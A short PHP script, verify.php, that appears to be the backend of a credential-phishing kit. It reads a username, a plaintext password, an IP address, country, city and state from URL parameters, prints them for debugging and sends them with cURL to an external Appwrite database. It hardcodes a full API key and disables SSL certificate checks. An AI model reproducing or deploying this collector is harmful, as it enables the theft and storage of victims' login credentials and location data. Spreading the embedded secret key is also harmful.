<?php
// ============================================
// VERIFY.PHP - FINAL WORKING VERSION
// ============================================

// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get data
$u = $_GET['u'] ?? '';
$p = $_GET['p'] ?? '';
$ip = $_GET['ip'] ?? '';
$country = $_GET['country'] ?? '';
$city = $_GET['city'] ?? '';
$state = $_GET['state'] ?? '';

// Appwrite config
$endpoint = 'https://fra.cloud.appwrite.io/v1';
$projectId = '6a40566e0000ce24258e';
$apiKey = 'standard_ea3534c309f3d66752d8bfcb09702bb24ca55396f2283e8b7a9c2d30fb63ae94faf5c4f34a41766305d59cb0bfa3caba01941624994ddb2d91769af6f2af25b22f6d21609df574aa020664440f3b7d496cd591ce3a960e5822acb6eae7ab85851b88115ba7614aad28d4fa6a9eeffe3e22f19774348f2de9b27a1a543f077866';  // ← PUT YOUR FULL API KEY HERE!
$databaseId = '6a4056fe0011aa4462d6';
$collectionId = '6a4057910024491b6393';

echo "<h1>🔍 Debug - verify.php</h1>";

// Show received data
echo "<h2>Received Data:</h2>";
echo "Username: " . htmlspecialchars($u) . "<br>";
echo "Password: " . htmlspecialchars($p) . "<br>";
echo "IP: " . htmlspecialchars($ip) . "<br>";
echo "Country: " . htmlspecialchars($country) . "<br>";
echo "City: " . htmlspecialchars($city) . "<br>";

// Build data - ONLY include fields that exist in your table
$data = [];
if (!empty($u)) $data['username'] = $u;
if (!empty($p)) $data['password'] = $p;
if (!empty($ip)) $data['ip'] = $ip;
if (!empty($country)) $data['country'] = $country;
if (!empty($city)) $data['city'] = $city;
if (!empty($state)) $data['state'] = $state;
$data['timestamp'] = date('Y-m-d H:i:s');

echo "<h2>Data to send:</h2>";
echo "<pre>" . json_encode($data, JSON_PRETTY_PRINT) . "</pre>";

$url = "$endpoint/databases/$databaseId/collections/$collectionId/documents";
echo "<h2>URL:</h2>";
echo "<code>$url</code><br><br>";

// Send via cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'X-Appwrite-Project: ' . $projectId,
    'X-Appwrite-Key: ' . $apiKey
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$result = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

echo "<h2>Response:</h2>";
echo "HTTP Code: $httpCode<br>";

if ($result) {
    echo "<pre style='background:#f0f0f0;padding:15px;border-radius:5px;overflow:auto;max-height:300px;'>";
    echo htmlspecialchars($result);
    echo "</pre>";
    
    // Check if successful
    $response = json_decode($result, true);
    if (isset($response['$id'])) {
        echo "<p style='color:green;font-size:18px;'>✅ SUCCESS! Document ID: " . $response['$id'] . "</p>";
    }
} else {
    echo "<p style='color:red;'>❌ Error: " . htmlspecialchars($error) . "</p>";
}
?>
